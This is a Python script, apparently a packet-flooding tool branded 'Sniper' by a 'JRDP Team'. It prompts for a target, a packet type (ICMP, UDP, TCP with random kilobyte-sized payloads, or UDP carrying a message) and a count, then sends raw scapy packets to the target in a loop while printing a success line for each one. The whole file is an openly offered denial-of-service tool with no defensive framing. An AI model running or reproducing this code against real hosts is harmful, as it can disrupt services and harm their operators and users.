import sys
from scapy.all import *
import os

ascii_art = """
\033[91m
   _____       _
  / ____|     (_)
 | (___  _ __  _ _ __   ___ _ __
  \___ \| '_ \| | '_ \ / _ \ '__|
  ____) | | | | | |_) |  __/ |
 |_____/|_| |_|_| .__/ \___|_|
                | |
                |_| by JRDP Team  https://github.com/JRDPCN
\033[0m
"""

def send_packets(target_url, packet_type, num_packets, packet_size, message=None):
    successful_packets = 0

    try:
        for i in range(int(num_packets)):
            if packet_type == 1:
                packet = IP(dst=target_url)/ICMP()
            elif packet_type == 2:
                packet = IP(dst=target_url)/UDP(dport=443)
                if message:
                    packet = packet/Raw(load=message.encode())
            elif packet_type == 3:
                packet_size = int(packet_size)
                packet_data = RandString(size=packet_size * 1024)
                packet = IP(dst=target_url)/TCP(dport=443, sport=RandShort())/Raw(load=packet_data)
            elif packet_type == 4:
                packet = IP(dst=target_url)/UDP(dport=443)
                if message:
                    packet = packet/Raw(load=message.encode())
            else:
                print(f"\033[91mInvalid packet type: {packet_type}\033[0m")
                return

            send(packet, verbose=0)
            successful_packets += 1
            print(f"\033[94mPACKET NR.{i + 1} \033[0m\033[92mSUCCESS\033[0m")

        print(f"\n\033[92mSuccessfully sent {successful_packets}/{num_packets} packets.\033[0m")

    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    os.system('clear')
    print(ascii_art)
    target_url = input("\033[95mEnter URL: \033[0m")
    print("\033[94m1. ICMP\n2. UDP\n3. TCP\n4. UDP with message\033[0m")
    packet_type = int(input("\033[95mSelect packet type: \033[0m"))
    
    if packet_type in [2, 4]:
        message = input("\033[95mEnter the message: \033[0m")
    else:
        message = None
    
    num_packets = input("\033[95mEnter amount of packets: \033[0m")
    if packet_type == 3:
        packet_size = input("\033[95mEnter size of packets (in KB) for TCP (use 0 for unlimited size): \033[0m")
    else:
        packet_size = None

    try:
        send_packets(target_url, packet_type, num_packets, packet_size, message)
    except Exception as e:
        print(f"An error occurred: {e}")
